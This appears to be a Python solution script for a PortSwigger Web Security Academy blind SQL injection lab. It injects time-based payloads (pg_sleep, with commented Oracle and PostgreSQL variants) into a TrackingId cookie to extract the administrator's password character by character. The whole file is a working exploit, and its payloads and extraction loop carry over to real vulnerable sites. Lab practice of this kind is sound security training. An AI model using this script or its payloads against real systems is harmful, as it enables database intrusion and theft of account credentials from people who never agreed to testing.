import requests

session = requests.session()

burp0_url = "https://ac4e1fb71e0b06e1c0f5356b00bb00ad.web-security-academy.net:443/filter?category=Pets"
burp0_cookies = {"TrackingId": "MQSdhPZaCDFINFme", "session": "QEKO5jh6RUoMXqSZkOf7CoxpRGrTE4PA"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://ac4e1fb71e0b06e1c0f5356b00bb00ad.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)



# ######################  until here burp paste of request for python  ########################## #

# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

url = burp0_url
cookies = burp0_cookies
headers = burp0_headers
char_list = "abcdefghijklmnopqrstuvwxyz1234567890"

def send_request_for_char():
    trackingId = burp0_cookies["TrackingId"]
    loaded_cookies = burp0_cookies
    response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response.status_code, len(response.content))
    click = (response.status_code)
    password = ""
    pass_index = 1
    ting = False


    while not ting:
        for i in char_list:
            # print(i)
            # payload = f"'||(SELECT CASE WHEN (SUBSTR(password,{pass_index},1)='{i}') THEN pg_sleep(2) ELSE '' END FROM users WHERE username='administrator')||'" #postgresql
            # payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pass_index},1)='{i}' THEN 'a'||dbms_pipe.receive_message(('a'),2) ELSE '' END FROM users WHERE username='administrator')||'" #oracle
            payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pass_index},1)='{i}')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--" #portswigger solution
            loaded_cookies["TrackingId"] = trackingId + payload
            print(loaded_cookies["TrackingId"])
            response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
            print(response.status_code, response.elapsed.total_seconds())
            if response.elapsed.total_seconds() > (1.0):
                password += i
                print(f"partial password is {password}")
                pass_index += 1
                break
            elif i == char_list[-1] and password != "":
                ting = True
                print(f"TING! password is ready!\n\npassword for username 'administrator' is:\n{password}\nuse it wisely")
                break
            elif i == char_list[-1] and password =="":
                print(f"sorry but no success pls check ingridiants:{char_list}")
                ting = True
                break

if __name__ == '__main__':
    send_request_for_char()

